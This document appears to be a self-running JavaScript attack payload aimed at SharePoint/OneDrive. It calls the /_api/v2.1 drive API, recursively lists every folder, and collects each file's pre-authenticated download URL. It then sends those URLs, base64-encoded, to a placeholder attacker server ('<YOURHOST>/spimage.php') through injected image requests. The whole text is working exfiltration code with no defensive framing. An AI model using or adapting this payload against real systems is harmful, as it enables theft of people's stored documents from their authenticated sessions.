	function getDriveId(data) {
        d = JSON.parse(data);
        return d.parentReference.driveId;
    }

    function startAttack() {
        var t = "/_api/v2.1/drive/items/root";
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("GET", t);
        xmlhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                var myArr = this.responseText;
                var driveId = getDriveId(myArr);
                var x = "/_api/v2.1/drives/" + driveId + "/root/children";
                startExfil(x, driveId);
            }
        };
        xmlhttp.send();
    }

    function startExfil(t, driveId) {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("GET", t);
        xmlhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                var d = JSON.parse(this.responseText);

                for (var x in d.value) {
                    try {
                        if (d.value[x].folder !== undefined) {
                            var nt = "/_api/v2.1/drives/" + driveId + "/items/" + d.value[x].id + "/children";
                            startExfil(nt, driveId);
                        } else {
                            corslite(d.value[x]['@content.downloadUrl'], d.value[x]['name']);
                        }
                    }
                    catch { console.log('no folder'); }
                }
            }
        }
        xmlhttp.send();
    }

    function imgadd(u) {
        var img = document.createElement('img');
        img.src = u;
        document.getElementById('imagehome').appendChild(img);
        down.innerHTML = "&nbsp;";
    }

    function corslite(data,nm){
	    imgadd("https://<YOURHOST>/spimage.php?name="+encodeURIComponent(nm)+"&auth_url="+btoa(data));
    }
    startAttack();